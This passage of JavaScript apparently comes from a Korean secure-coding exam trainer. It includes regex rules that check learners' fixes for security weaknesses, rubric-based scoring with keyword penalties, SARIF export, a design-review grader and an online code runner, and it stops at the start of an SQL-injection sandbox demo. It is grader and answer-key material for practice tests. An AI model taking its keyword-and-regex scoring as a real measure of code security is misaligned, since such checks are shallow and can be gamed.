  '종료되지 않는 반복문 또는 재귀함수':{any:[/if\s*\([^)]*<=?\s*[01]\b/,/if\s*\([^)]*==\s*[01]\b/,/return\s+1\b/,/\bbreak\b/,/<=\s*0\b/]},
  '오류 메시지 정보 노출':{any:[/logger\.(error|warn|info)/i,/log\.(error|warn|info)/i,/logging\./i,/slf4j/i],none:[/printstacktrace/i,/println\s*\(\s*e\b/i,/print\s*\([^)]*traceback/i]},
  '오류 상황 대응 부재':{all:[/catch\s*\(|except\s+/i],any:[/return\s+\w+/i,/throw\s+/i,/\braise\b/i,/setmessage/i,/log(ger)?\./i],none:[/catch\s*\([^)]*\)\s*\{\s*\}/i,/except[^:]*:\s*pass/i]},
  '부적절한 예외 처리':{any:[/except\s+\w*(error|exception)/i,/catch\s*\(\s*\w*(exception|error)/i],none:[/except\s*:/i,/except\s+exception\b/i]},
  '부적절한 자원 해제':{any:[/finally\s*\{/i,/try\s*\(/i,/with\s+open/i,/using\s*\(/i,/\bdefer\b/i]},
  '초기화되지 않은 변수 사용':{any:[/\b(int|char|long|float|double|short)\s+\w+\s*=/i,/=\s*(0|1|null|""|\{\}|\{0\})/,/\w+\s*=\s*new\s/i]},
  'Public 메소드로부터 반환된 Private 배열':{any:[/new\s+\w+\[[^\]]*\.length\]/i,/\.clone\s*\(\s*\)/i,/arrays\.copyof/i,/system\.arraycopy/i,/collections\.unmodifiable/i,/list\.copyof/i]},
  'Private 배열에 Public 데이터 할당':{any:[/new\s+\w+\[[^\]]*\.length\]/i,/\.clone\s*\(\s*\)/i,/arrays\.copyof/i,/system\.arraycopy/i,/list\.copyof/i]},
  'DNS lookup에 의존한 보안 결정':{any:[/getremoteaddr/i],none:[/getremotehost\s*\(/i,/gethostname\s*\(/i,/getcanonicalhostname/i,/gethostbyname/i]},
  '취약한 API 사용':{any:[/gets_s/i,/fgets/i,/scanf_s/i,/strncpy|snprintf|strlcpy/i],none:[/\bgets\s*\(/i,/\bstrcpy\s*\(/i,/\bsprintf\s*\(/i,/\bscanf\s*\(/i]}
};
function verifySecurePattern(code, lang, weakness){
  const def=LASHR[weakness]; if(!def) return {mapped:false, ok:false};  // 미매핑 약점은 키워드 채점만
  const c=cleanCode(code, lang);  // AST(또는 정규식 폴백)로 주석 제거 후 검사
  const allOk=!def.all || def.all.every(r=>r.test(c));
  const anyOk=!def.any || def.any.some(r=>r.test(c));
  const noneOk=!def.none || def.none.every(r=>!r.test(c));
  return {mapped:true, ok: allOk && anyOk && noneOk};
}
function gradeOne(p,ans){
  let parts=[],score=0;const tpOK=(ans.tp===p.isTruePositive);let struct=null;
  if(p.isTruePositive){
    parts.push(['정·오탐 판별',tpOK?30:0,30]);score+=tpOK?30:0;
    let nm=0;if(ans.tp){const u=gnorm(ans.name),g=gnorm(p.weaknessName);if(u&&u===g)nm=20;else if(u&&(g.includes(u)||u.includes(g))&&u.length>=2)nm=10;}parts.push(['보안약점 명칭',nm,20]);score+=nm;
    const rk=kwScore(ans.reason,p.reasonKeywords,25);parts.push(['진단 근거',rk,25]);score+=rk;
    let ck=ans.tp?kwScore(cleanCode(ans.fix,p.lang),p.safeCodeKeywords,25):0;
    if(ans.tp){
      struct=verifySecurePattern(ans.fix,p.lang,p.weaknessName);
      if(struct.mapped){
        if(struct.ok)ck=25;                 // 핵심 구조 검증 통과 → 만점 보장
        else ck=Math.min(ck,18);            // 키워드만 있고 구조 미확인 → 부분 인정(상한 18)
      }
    }
    parts.push(['개선 코드',ck,25]);score+=ck;
  }else{
    parts.push(['정·오탐 판별',tpOK?50:0,50]);score+=tpOK?50:0;
    const rk=kwScore(ans.reason,p.reasonKeywords,50);parts.push(['판별 근거',rk,50]);score+=rk;
  }
  // 틀린/부적절한 진단 서술 감점 (예: 안전한 코드를 취약하다고 단정)
  const negHits=(p.negKw||[]).filter(k=>kwHit(ans.reason,k)||(ans.tp&&p.isTruePositive&&kwHit(ans.name,k)));
  const penalty=Math.min(negHits.length*8, p.isTruePositive?24:30);
  if(penalty){score-=penalty;parts.push(['오류 서술 감점',-penalty,0,true]);}
  return {score:Math.max(0,Math.round(score)),parts,tpOK,negHits,penalty,struct};
}
async function submitPrac(){
  if(prTP===null){alert('먼저 정·오탐을 판별하세요.');return;}
  const p=prPool[prIdx];
  if(prTP===true){try{await loadTreeSitter(p.lang);}catch(e){}}  // 채점 전 AST 파서 준비(폴백 안전)
  const ans={tp:prTP,name:document.getElementById('prName').value,reason:document.getElementById('prReason').value,fix:document.getElementById('prFix').value};
  const r=gradeOne(p,ans);prScores.push(r.score);prResults.push({p:p,ans:ans,r:r});
  const wkey='[2교시 실무] '+p.title+' ('+p.lang+')';
  if(r.score<60)addWrong({q:wkey,a:(p.isTruePositive?('정탐 · '+p.weaknessName+(p.cwe?' ('+p.cwe+')':'')):'오탐(안전한 코드)'),e:p.explanation,tag:'2교시',code:p.code||'',cat:p.cat||''});
  else if(r.score>=70)removeWrong(wkey);
  // 잠금
  ['tfTP','tfFP'].forEach(id=>document.getElementById(id).setAttribute('onclick',''));
  document.getElementById('prName').disabled=true;document.getElementById('prReason').disabled=true;document.getElementById('prFix').disabled=true;
  document.querySelector('#v-prac .nav').style.display='none';
  let kwhtml=p.reasonKeywords.map(k=>'<span class="kw'+(kwHit(ans.reason,k)?' hit':'')+'">'+esc(k)+'</span>').join('');
  let bars=r.parts.map(pt=>pt[3]
    ?'<div class="prow2"><div class="l penline">'+pt[0]+'</div><div class="bar"></div><div class="g penline">'+pt[1]+'점</div></div>'
    :'<div class="prow2"><div class="l">'+pt[0]+'</div><div class="bar"><i style="width:'+Math.round(pt[1]/pt[2]*100)+'%"></i></div><div class="g">'+pt[1]+'/'+pt[2]+'</div></div>').join('');
  let negBlock=(r.negHits&&r.negHits.length)?'<div style="margin-top:6px;font-size:13px;color:#b91c1c">⚠ 부적절·틀린 진단 서술 감지 (−'+r.penalty+'점): '+r.negHits.map(k=>'<span class="neg-kw">'+esc(k)+'</span>').join('')+'</div>':'';
  const astTag=astReady(p.lang)?' <span class="ast-on">🌳 AST 정밀</span>':' <span class="ast-off">LASHR(정규식)</span>';
  let structBlock=(r.struct&&r.struct.mapped)?'<div class="structline '+(r.struct.ok?'ok':'no')+'">🔬 구조 검증'+astTag+': '+(r.struct.ok?'✅ 핵심 보안 구조 확인됨 (개선 코드 만점)':'⚠ 핵심 구조 미확인 — 키워드 기반 부분 인정. 모범답안의 구조와 비교해 보세요.')+'</div>':'';
  let model='<div class="model"><h4>📋 모범답안</h4>'+
    '<div style="font-size:14px;margin-bottom:8px"><b>정답 판별:</b> '+(p.isTruePositive?'🚨 정탐 (보안약점 존재)':'🛡️ 오탐 (안전한 코드)')+(p.isTruePositive?' &nbsp; <b>명칭:</b> '+esc(p.weaknessName)+(p.cwe?' ('+esc(p.cwe)+')':''):'')+'</div>'+
    '<div style="font-size:13.5px;margin-bottom:8px"><b>근거 핵심 키워드:</b><br>'+kwhtml+'</div>'+
    '<div style="font-size:14px;line-height:1.7;margin-bottom:10px"><b>해설:</b> '+esc(p.explanation)+'</div>';
  if(p.isTruePositive&&p.safeCode){
    model+='<div style="margin-top:12px"><h5 style="font-size:12px;color:var(--muted);margin-bottom:5px;font-family:JetBrains Mono,monospace">🔧 취약 → 안전 변경점 (diff) <span style="color:#fca5a5">- 제거</span> / <span style="color:#86efac">+ 추가</span></h5><pre class="diffpre">'+diffHtml(p.code,p.safeCode)+'</pre></div>';
    model+='<div class="two" style="margin-top:10px"><div class="pane"><h5>내 작성 코드</h5><pre style="margin:0">'+esc(ans.fix)+'</pre></div><div class="pane"><h5>모범 안전 코드</h5><pre style="margin:0">'+esc(p.safeCode)+'</pre></div></div>';
  }
  model+='</div>';
  const pass=r.score>=70;
  document.getElementById('prReport').innerHTML='<div class="report"><div class="scoreline"><div class="num '+(pass?'pass':'fail')+'">'+r.score+'점</div><div>'+(r.tpOK?'<span class="pass">✔ 정·오탐 정확</span>':'<span class="fail">✗ 정·오탐 오답</span>')+'</div></div>'+bars+structBlock+negBlock+model+
    '<div class="nav" style="display:block"><button class="btn" onclick="'+(prIdx===prN-1?'prResult()':'nextPrac()')+'">'+(prIdx===prN-1?'결과 보기':'다음 문항 →')+'</button></div></div>';
  document.getElementById('prReport').scrollIntoView({behavior:'smooth',block:'nearest'});
}
function nextPrac(){prIdx++;drawPrac();}
function prResult(){
  clearInterval(prTimer);const avg=prScores.length?Math.round(prScores.reduce((a,b)=>a+b,0)/prScores.length):0;const pass=avg>=70;
  if(pracBest==null||avg>pracBest){pracBest=avg;save('pracBest',avg);}
  awardXp(Math.max(3,Math.round(avg/5)),'2교시 응시 '+avg+'%');
  const sarifBtn=prResults.length?'<button class="btn ghost" onclick="exportSarif()">📤 SARIF 내보내기</button>':'';
  document.getElementById('v-prac').innerHTML='<div class="res"><div class="big">'+avg+'%</div><div class="pf '+(pass?'pass':'fail')+'">'+(pass?'✅ 합격 (평균 70%+)':'❌ 불합격')+'</div><p class="sub">'+prScores.length+'문항 평균 점수</p><div class="quick" style="justify-content:center"><button class="btn" onclick="rPrac()">다시 응시</button>'+sarifBtn+'<button class="btn ghost" onclick="tab(\'wrong\')">오답노트 ('+wrongs.length+')</button></div>'+(sarifBtn?'<p class="sub" style="margin-top:8px">SARIF 2.1.0 표준 — SonarQube·GitHub Security 탭에 임포트해 진단 이력으로 활용할 수 있습니다.</p>':'')+'</div>';
  announce('2교시 채점 완료. 평균 '+avg+'점, '+(pass?'합격':'불합격')+'.');
}

// ===== 📤 SARIF 2.1.0 내보내기 — 2교시 정·오탐 판별 결과를 진단도구 표준 포맷으로 =====
function slug(s){return (s||'').toString().replace(/[^A-Za-z0-9가-힣]+/g,'-').replace(/^-+|-+$/g,'').slice(0,40)||'item';}
function buildSarif(results){
  const EXT={'Java':'java','C':'c','Python':'py'};
  const ruleMap={};
  const sarifResults=results.map((it,i)=>{
    const p=it.p,r=it.r,ans=it.ans||{};
    const rid=p.isTruePositive?(p.cwe||p.weaknessName||'KISA-WEAKNESS'):'KISA-SAFE';
    if(!ruleMap[rid])ruleMap[rid]={id:rid,name:(p.isTruePositive?(p.weaknessName||'보안약점'):'안전한 코드(오탐 대상)'),
      shortDescription:{text:(p.isTruePositive?(p.weaknessName+(p.cwe?(' ('+p.cwe+')'):'')):'정상 코드 — 취약점 없음')},
      properties:{category:p.cat||'',kisaType:p.cat||''}};
    const judged=(ans.tp===p.isTruePositive);
    const uri='practical/'+slug(p.title)+'.'+(EXT[p.lang]||'txt');
    return {ruleId:rid,
      level:p.isTruePositive?(judged?'error':'warning'):'note',
      message:{text:(p.isTruePositive?'정탐(보안약점 존재)':'오탐(안전한 코드)')+' · 응시자 판별: '+(ans.tp?'정탐':'오탐')+' ('+(judged?'정확':'오답')+') · 점수 '+(r?r.score:0)+'/100'+(ans.reason?(' · 근거: '+ans.reason):'')},
      locations:[{physicalLocation:{artifactLocation:{uri:uri},region:{startLine:1}}}],
      properties:{isTruePositive:!!p.isTruePositive,userJudgedTruePositive:!!ans.tp,judgmentCorrect:judged,score:(r?r.score:0),language:p.lang,kisaType:p.cat||'',weakness:p.weaknessName||''}};
  });
  return {"$schema":"https://json.schemastore.org/sarif-2.1.0.json","version":"2.1.0",
    runs:[{tool:{driver:{name:"SecureDevAcademy-LASHR",informationUri:"https://vuln-sim.web.app",version:"1.0.0",
      organization:"KISA 보안약점 진단원 학습 센터",rules:Object.keys(ruleMap).map(k=>ruleMap[k])}},
      results:sarifResults}]};
}
function exportSarif(){
  const obj=buildSarif(prResults);
  const blob=new Blob([JSON.stringify(obj,null,2)],{type:'application/sarif+json'});
  const url=URL.createObjectURL(blob);const a=document.createElement('a');
  a.href=url;a.download='secure-dev-academy-result.sarif';document.body.appendChild(a);a.click();
  setTimeout(()=>{URL.revokeObjectURL(url);if(a.parentNode)a.parentNode.removeChild(a);},100);
  announce('SARIF 파일을 내보냈습니다.');
}

// ===== 📐 설계 진단 (복합서술형) — 설계 산출물 검토 → 진단보고서 작성 =====
const DESIGN_CATS=['입력데이터 검증 및 표현','보안기능','에러처리','세션통제'];
let dsIdx=-1,dsV=null;
function rDesign(){
  const list=DESIGN.map((d,i)=>'<div class="ds-card"><div class="ds-h"><b>'+esc(d.title)+'</b></div><div class="ds-sc">'+esc(d.scenario)+'</div><button class="qbtn" onclick="startDesign('+i+')">📐 진단 시작</button></div>').join('');
  document.getElementById('v-design').innerHTML='<h2 class="st">📐 설계 진단 (복합서술형)</h2>'+examInfoHtml()+
   '<p class="sub">실제 2교시 복합서술형: 설계 산출물(요구사항 정의서·아키텍처 설계서·개발 가이드)을 검토해 <b>진단보고서</b>(분류 · 진단결과 Y/N · 현황 및 문제점 · 개선방안)를 작성합니다. ('+DESIGN.length+'개 시나리오)</p>'+
   '<div class="ds-list">'+list+'</div>';
}
function startDesign(i){dsIdx=i;dsV=null;drawDesign();}
function drawDesign(){
  const d=DESIGN[dsIdx];
  const docs=d.docs.map(x=>'<div class="ds-doc"><div class="ds-doc-h">📄 '+esc(x.name)+'</div><pre>'+esc(x.content)+'</pre></div>').join('');
  const cats=DESIGN_CATS.map(c=>'<option value="'+esc(c)+'">'+esc(c)+'</option>').join('');
  document.getElementById('v-design').innerHTML='<div class="qbox"><span class="typetag t-PRAC">복합서술형</span> <span class="cat-tag">'+esc(d.title)+'</span>'+
   '<p class="sub" style="margin-top:8px">'+esc(d.scenario)+'</p>'+
   '<div class="ds-docs">'+docs+'</div>'+
   '<div class="flbl">1) 보안약점 분류</div><select class="pin" id="dsCat"><option value="">선택하세요</option>'+cats+'</select>'+
   '<div class="flbl">2) 진단결과</div><div class="tfrow"><div class="tf tp" id="dsY" onclick="setDsV(true)"><span class="rd"></span>■ Y — 취약점(결함) 있음</div><div class="tf fp" id="dsN" onclick="setDsV(false)"><span class="rd"></span>□ N — 이상 없음</div></div>'+
   '<div class="flbl">3) 현황 및 문제점 (4점) <span style="font-weight:400;color:#94a3b8">— 어느 산출물의 어떤 부분이 왜 문제인지</span></div><textarea class="parea" id="dsStatus" placeholder="예) 개발가이드의 비밀번호 검증이 length()<6 으로 되어 8자리 규칙보다 짧게 통과됨 …"></textarea>'+
   '<div class="flbl">4) 개선방안 (4점)</div><textarea class="parea" id="dsFix" placeholder="구체적인 수정·개선 방안을 서술 …"></textarea>'+
   '<div class="nav"><button class="btn" onclick="submitDesign()">제출 및 채점</button> <button class="btn ghost" onclick="rDesign()">목록</button></div><div id="dsReport"></div></div>';
  window.scrollTo(0,0);
}
function setDsV(v){dsV=v;document.getElementById('dsY').classList.toggle('sel',v===true);document.getElementById('dsN').classList.toggle('sel',v===false);}
function gradeDesign(d,ans){
  let parts=[],s=0;
  const cOK=ans.cat===d.category;parts.push(['보안약점 분류',cOK?20:0,20]);s+=cOK?20:0;
  const vOK=ans.vuln===d.isVulnerable;parts.push(['진단결과(Y/N)',vOK?20:0,20]);s+=vOK?20:0;
  const sk=kwScore(ans.status,d.statusKeywords,30);parts.push(['현황 및 문제점',sk,30]);s+=sk;
  const fk=kwScore(ans.fix,d.fixKeywords,30);parts.push(['개선방안',fk,30]);s+=fk;
  return {score:Math.round(s),parts:parts,cOK:cOK,vOK:vOK};
}
function submitDesign(){
  const d=DESIGN[dsIdx];
  if(dsV===null){alert('진단결과(Y/N)를 선택하세요.');return;}
  const ans={cat:document.getElementById('dsCat').value,vuln:dsV,status:document.getElementById('dsStatus').value,fix:document.getElementById('dsFix').value};
  const r=gradeDesign(d,ans);
  awardXp(Math.max(4,Math.round(r.score/4)),'설계 진단 '+r.score+'점');
  const wkey='[설계 진단] '+d.title;
  if(r.score<60)addWrong({q:wkey,a:'분류: '+d.category+' / '+(d.isVulnerable?'Y(취약)':'N(이상없음)'),e:d.explanation,tag:'설계',code:'',cat:''});
  else if(r.score>=70)removeWrong(wkey);
  const bars=r.parts.map(p=>'<div class="prow2"><div class="l">'+p[0]+'</div><div class="bar"><i style="width:'+Math.round(p[1]/p[2]*100)+'%"></i></div><div class="g">'+p[1]+'/'+p[2]+'</div></div>').join('');
  const skw=d.statusKeywords.map(k=>'<span class="kw'+(kwHit(ans.status,k)?' hit':'')+'">'+esc(k)+'</span>').join('');
  const fkw=d.fixKeywords.map(k=>'<span class="kw'+(kwHit(ans.fix,k)?' hit':'')+'">'+esc(k)+'</span>').join('');
  const pass=r.score>=70;
  document.getElementById('dsReport').innerHTML='<div class="report"><div class="scoreline"><div class="num '+(pass?'pass':'fail')+'">'+r.score+'점</div><div>'+(r.cOK?'<span class="pass">✔ 분류 정확</span>':'<span class="fail">✗ 분류 오답</span>')+' '+(r.vOK?'<span class="pass">✔ 진단결과 정확</span>':'<span class="fail">✗ 진단결과 오답</span>')+'</div></div>'+bars+
   '<div class="model"><h4>📋 모범 진단보고서</h4>'+
   '<div style="font-size:13.5px;margin:6px 0"><b>분류:</b> '+esc(d.category)+' &nbsp; <b>진단결과:</b> '+(d.isVulnerable?'Y (취약)':'N (이상 없음)')+' &nbsp; <b>관련 약점:</b> '+esc(d.weakness)+'</div>'+
   '<div style="margin:8px 0"><b>현황·문제점 핵심 키워드:</b><br>'+skw+'</div>'+
   '<div style="font-size:14px;line-height:1.7;margin:6px 0"><b>현황 및 문제점:</b> '+esc(d.modelStatus)+'</div>'+
   '<div style="margin:8px 0"><b>개선방안 핵심 키워드:</b><br>'+fkw+'</div>'+
   '<div style="font-size:14px;line-height:1.7;margin:6px 0"><b>개선방안:</b> '+esc(d.modelFix)+'</div>'+
   '<div style="font-size:13.5px;color:var(--muted);margin-top:8px">💡 '+esc(d.explanation)+'</div></div>'+
   '<div class="nav" style="display:block"><button class="btn ghost" onclick="rDesign()">← 목록으로</button></div></div>';
  document.getElementById('dsReport').scrollIntoView({behavior:'smooth',block:'nearest'});
}

// ===== 💻 온라인 IDE (Monaco + Pyodide/Wandbox 실제 실행) =====
const IDELANGMAP={'Java':'java','C':'c','Python':'python'};
let ideEditor=null, ideMonacoP=null, ideCur=null, pyodide=null, pyLoadP=null;
function loadMonaco(){
  if(window.monaco) return Promise.resolve();
  if(ideMonacoP) return ideMonacoP;
  ideMonacoP=new Promise((res,rej)=>{
    const base='https://cdn.jsdelivr.net/npm/monaco-editor@0.45.0/min/vs';
    const s=document.createElement('script');s.src=base+'/loader.js';
    s.onload=()=>{window.require.config({paths:{vs:base}});window.require(['vs/editor/editor.main'],()=>res());};
    s.onerror=rej;document.head.appendChild(s);
  });
  return ideMonacoP;
}
function ideOptions(){
  let h='<optgroup label="▶ 실행 가능 보안 데모 (취약 vs 안전)">';
  RUNNABLE.forEach((r,i)=>{h+='<option value="R:'+i+'">['+esc(r.lang)+'] '+esc(r.weakness)+' — '+esc(r.title)+'</option>';});
  h+='</optgroup><optgroup label="📄 KISA 49개 단편 (편집·실험용)">';
  CONCEPTS.forEach((c,ci)=>{const cd=CODE49[c.name];if(!cd)return;const jl=cd.javaLang||'Java';
    if(cd.javaVuln)h+='<option value="C:'+ci+':javaVuln">['+esc(jl)+' 취약] '+esc(c.name)+'</option>';
    if(cd.javaSafe)h+='<option value="C:'+ci+':javaSafe">['+esc(jl)+' 안전] '+esc(c.name)+'</option>';
    if(cd.pyVuln)h+='<option value="C:'+ci+':pyVuln">[Python 취약] '+esc(c.name)+'</option>';
    if(cd.pySafe)h+='<option value="C:'+ci+':pySafe">[Python 안전] '+esc(c.name)+'</option>';
  });
  h+='</optgroup>';return h;
}
function ideLoad(){
  const v=document.getElementById('ideExample').value;let code='',lang='Python',note='';
  if(v[0]==='R'){const r=RUNNABLE[+v.slice(2)];code=r.code;lang=r.lang;note='✅ 실행 가능 데모 — '+r.note;}
  else{const p=v.split(':');const c=CONCEPTS[+p[1]];const cd=CODE49[c.name];const f=p[2];code=cd[f]||'';
    lang=(f.indexOf('java')===0)?(cd.javaLang==='C'?'C':'Java'):'Python';
    note='📄 KISA 가이드 단편 — 프레임워크/문맥에 의존하므로 그대로는 컴파일·실행이 안 될 수 있습니다(편집·실험용). 실행 가능한 데모는 목록 상단에서 선택하세요.';}
  ideCur={lang};
  document.getElementById('ideLang').textContent=lang;
  document.getElementById('ideNote').textContent=note;
  if(ideEditor){ideEditor.setValue(code);window.monaco.editor.setModelLanguage(ideEditor.getModel(),IDELANGMAP[lang]||'plaintext');}
}
function rIDE(){
  if(ideEditor){try{ideEditor.dispose();}catch(e){}ideEditor=null;}
  document.getElementById('v-ide').innerHTML=
    '<h2 class="st">💻 코드 실행 — 온라인 IDE</h2><p class="sub">VS Code 엔진(<b>Monaco</b>)에서 직접 편집·실행합니다. <b>Python</b>은 브라우저 내 실제 실행(Pyodide), <b>Java·C</b>는 무료 외부 실행 API(Wandbox, 원격 gcc/openjdk)로 컴파일·실행합니다. ⚠️ Java/C 실행 시 코드가 외부 서비스로 전송됩니다(교육용 예제 기준).</p>'+
    '<div class="ide-bar"><select id="ideExample" class="ide-sel" onchange="ideLoad()" aria-label="예제 선택">'+ideOptions()+'</select><span class="ide-lang" id="ideLang"></span><button class="qbtn" id="ideRunBtn" onclick="runIDE()">▶ 실행</button><button class="qbtn ghost" onclick="ideLoad()">↺ 예제 복원</button></div>'+
    '<div class="ide-note" id="ideNote"></div>'+
    '<div id="ideEditor" class="ide-editor">에디터를 불러오는 중…</div>'+
    '<div class="ide-out-h">📤 출력 <span id="ideStatus" class="ide-status"></span></div>'+
    '<pre class="ide-out" id="ideOut">▶ 실행 버튼을 누르면 결과가 여기에 표시됩니다.</pre>';
  loadMonaco().then(()=>{
    document.getElementById('ideEditor').textContent='';
    ideEditor=window.monaco.editor.create(document.getElementById('ideEditor'),{value:'',language:'python',theme:'vs-dark',fontSize:13.5,minimap:{enabled:false},automaticLayout:true,scrollBeyondLastLine:false});
    ideLoad();
  }).catch(()=>{document.getElementById('ideEditor').innerHTML='<div class="ide-fallback">에디터(Monaco)를 불러오지 못했습니다. 네트워크 연결을 확인한 뒤 다시 시도하세요.</div>';});
}
function ideStat(t){const e=document.getElementById('ideStatus');if(e)e.textContent=t||'';}
function ideOut(t){const e=document.getElementById('ideOut');if(e)e.textContent=t;}
function loadPyodideOnce(){
  if(pyodide)return Promise.resolve(pyodide);
  if(pyLoadP)return pyLoadP;
  pyLoadP=(async()=>{
    await new Promise((res,rej)=>{const s=document.createElement('script');s.src='https://cdn.jsdelivr.net/pyodide/v0.26.4/full/pyodide.js';s.onload=res;s.onerror=rej;document.head.appendChild(s);});
    pyodide=await window.loadPyodide({indexURL:'https://cdn.jsdelivr.net/pyodide/v0.26.4/full/'});
    return pyodide;
  })();
  return pyLoadP;
}
async function runPython(code){
  const py=await loadPyodideOnce();
  py.runPython('import sys,io\n_buf=io.StringIO()\nsys.stdout=_buf\nsys.stderr=_buf');
  let err='';
  try{py.runPython(code);}catch(e){err='\n'+String(e.message||e);}
  let out='';try{out=py.runPython('_buf.getvalue()');}catch(e){}
  return (out||'')+err;
}
async function wandboxRun(lang,code){
  // Wandbox 원격 컴파일·실행 (Piston은 2026-02 화이트리스트 전환으로 사용 불가)
  const comp=(lang==='Java')?'openjdk-jdk-22+36':(lang==='C')?'gcc-13.2.0-c':'gcc-13.2.0';
  let src=code;
  // Wandbox는 Java 소스를 prog.java로 저장하므로 public 최상위 클래스는 컴파일 실패 → public 제거
  if(lang==='Java'){src=src.replace(/public\s+class\s+/, 'class ');}
  const r=await fetch('https://wandbox.org/api/compile.json',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({code:src,compiler:comp,options:(lang==='Java')?'':'warning',stdin:''})});
  const j=await r.json();let out='';
  if(j.compiler_error)out+='[컴파일]\n'+j.compiler_error+'\n';
  if(j.program_output)out+=j.program_output;
  if(j.program_error)out+='\n[stderr]\n'+j.program_error;
  return out||('(출력 없음 · status '+(j.status||'?')+')');
}
async function runIDE(){
  if(!ideEditor){alert('에디터를 불러오는 중입니다. 잠시 후 다시 시도하세요.');return;}
  const code=ideEditor.getValue();const lang=(ideCur&&ideCur.lang)||'Python';
  const btn=document.getElementById('ideRunBtn');btn.disabled=true;
  ideStat(lang==='Python'?'Pyodide 실행 중…(최초 1회 로딩 다소 소요)':'Wandbox 컴파일·실행 중…');ideOut('실행 중…');
  try{
    const out=(lang==='Python')?await runPython(code):await wandboxRun(lang,code);
    ideOut(out||'(출력 없음)');ideStat('완료 ✓');announce('코드 실행 완료');
  }catch(e){ideOut('실행 오류: '+(e.message||e)+'\n(네트워크/외부 API 상태를 확인하세요)');ideStat('오류');}
  finally{btn.disabled=false;}
}

// ===== 오답노트 복습 (Leitner SRS 카드) =====
let rvDeck=[],rvIdx=0,rvFlip=false;
function rvStart(all){
  rvDeck=shuffle(wrongs.filter(w=>all?true:srsDue(w)));
  if(!rvDeck.length){alert(all?'복습할 오답이 없습니다.':'지금 복습 예정인 항목이 없습니다. (간격 반복 일정에 따라 나중에 다시 출제됩니다)');return;}
  rvIdx=0;rvFlip=false;rvCard();
}
function rvCard(){
  if(rvIdx>=rvDeck.length){
    document.getElementById('v-wrong').innerHTML='<h2 class="st">🔁 복습 완료</h2><div class="res"><div class="big">👏</div><p class="sub">이번 복습 세션을 마쳤습니다. 남은 오답 '+wrongs.length+'건 · 다음 복습 예정 '+dueCount()+'건</p><div class="quick" style="justify-content:center"><button class="btn" onclick="rWrong()">오답노트로</button></div></div>';return;
  }
  const w=rvDeck[rvIdx];const box='<span class="rv-box">Leitner '+(w.box||1)+'/5</span>';
  const front='<div class="rv-tag">['+(w.tag||'')+'] '+box+'</div><div class="rvq">'+esc(w.q)+'</div>'+(w.code?'<pre class="cpre" style="margin-top:10px;text-align:left">'+esc(w.code)+'</pre>':'')+'<div class="hint" style="margin-top:12px">정답을 떠올린 뒤 카드를 눌러 확인하세요</div>';
  const back='<div class="rv-tag">['+(w.tag||'')+'] '+box+'</div><div class="rvq" style="color:#15803d">정답: '+esc(w.a)+'</div>'+(w.e?'<div class="rev" style="border-left-color:#6366f1;margin-top:10px;text-align:left"><div class="rv-exp">'+esc(w.e)+'</div></div>':'');
  document.getElementById('v-wrong').innerHTML='<h2 class="st">🔁 오답 복습 ('+(rvIdx+1)+'/'+rvDeck.length+')</h2><p class="sub">간격 반복(SM-2): 회상 난이도를 평가하면 용이도(ease)에 따라 다음 복습 간격이 정해집니다. 반복 숙달 시 노트에서 졸업, 틀리면 즉시 재출제됩니다.</p>'+
    '<div class="flash-stage"><div class="fcard" onclick="rvFlipCard()">'+(rvFlip?back:front)+'</div>'+
    (rvFlip
      ?'<div class="frow frow3"><button class="f-no" onclick="rvMark(2)">✗ 다시</button><button class="f-mid" onclick="rvMark(3)">~ 애매</button><button class="f-ok" onclick="rvMark(5)">✓ 완벽</button></div>'
      :'<div class="frow"><button class="btn" onclick="rvFlipCard()">정답 확인 →</button></div>')+
    '</div>';
}
function rvFlipCard(){rvFlip=!rvFlip;rvCard();}
function rvMark(q){const w=rvDeck[rvIdx];const r=srsUpdate(w,q);announce(r.graduated?'졸업 처리됨':'다음 복습 '+r.interval+'일 후');rvIdx++;rvFlip=false;rvCard();}

// ===== 오답노트 =====
function rWrong(){
  if(!wrongs.length){document.getElementById('v-wrong').innerHTML='<h2 class="st">❌ 오답노트</h2><div class="empty">아직 틀린 문제가 없습니다.<br>1교시·2교시를 풀면 틀린 문제가 자동으로 모입니다.</div>';return;}
  const due=dueCount();
  const items=wrongs.map((w,i)=>'<div class="witem"><button class="del" onclick="delWrong('+i+')">삭제</button><div class="wq">['+(w.tag||'')+'] <span class="rv-box">L'+(w.box||1)+'</span>'+(srsDue(w)?'<span class="due-tag">복습 예정</span>':'<span class="next-tag">다음 복습 '+daysUntil(w)+'</span>')+' '+esc(w.q)+'</div><div class="wa">정답: '+esc(w.a)+'</div><div class="we">해설: '+esc(w.e)+'</div></div>').join('');
  document.getElementById('v-wrong').innerHTML='<h2 class="st">❌ 오답노트 ('+wrongs.length+')</h2><p class="sub">간격 반복(SM-2) 복습으로 약점을 굳히세요. 오늘 복습 예정 <b>'+due+'</b>건.</p>'+
   '<div class="quick"><button class="qbtn" onclick="rvStart(false)">🔁 오늘 복습 시작 ('+due+')</button><button class="qbtn ghost" onclick="rvStart(true)">전체 복습</button><button class="reset" onclick="clearWrong()" style="margin-left:auto">전체 비우기</button></div>'+
   '<div class="wlist" style="margin-top:14px">'+items+'</div>';
}
function delWrong(i){wrongs.splice(i,1);save('wrong',wrongs);rWrong();}
function clearWrong(){if(confirm('오답노트를 전부 비울까요?')){wrongs=[];save('wrong',wrongs);rWrong();}}

// ===== B2B SaaS 상용화 데모 기능 =====
function rSaas() {
  document.getElementById('v-saas').innerHTML = `
    <h2 class="st">🚀 B2B SaaS 상용화 핵심 피처 데모</h2>
    <p class="sub">글로벌 1티어 보안 교육 서비스 수준의 핵심 기능 데모 및 상용화 인터랙티브 프리뷰입니다.</p>
    
    <div class="saas-container">
      
      <!-- 1) Exploit-to-Fix Sandbox -->
      <div class="saas-section">
        <h3><span class="saas-badge">Feature 1</span> Exploit-to-Fix 양방향 대화형 샌드박스</h3>
        <p class="sub" style="margin-bottom:14px">소스 코드의 보안 결함을 수정하기 전, 실제 해커의 공격을 연출해 보고(Exploit), 코드를 수정한 뒤 방어가 성공적으로 이루어지는지(Fix) 직접 테스트할 수 있는 시각적 실습 도구입니다.</p>
        
        <div class="saas-grid-2">
          <!-- Left: Code & Input -->
          <div class="sandbox-box">
            <div class="sandbox-header">
              <span>📄 ProductController.java (SQL Injection 취약)</span>
              <div>
                <span class="sandbox-dot" style="background:#ef4444"></span>
                <span class="sandbox-dot" style="background:#f59e0b"></span>
                <span class="sandbox-dot" style="background:#22c55e"></span>
              </div>
            </div>
            <div class="sandbox-body">
              <div class="sandbox-editor-p" id="sandboxCode">
// 취약한 원래 코드: 문자열 연결로 SQL 쿼리 생성
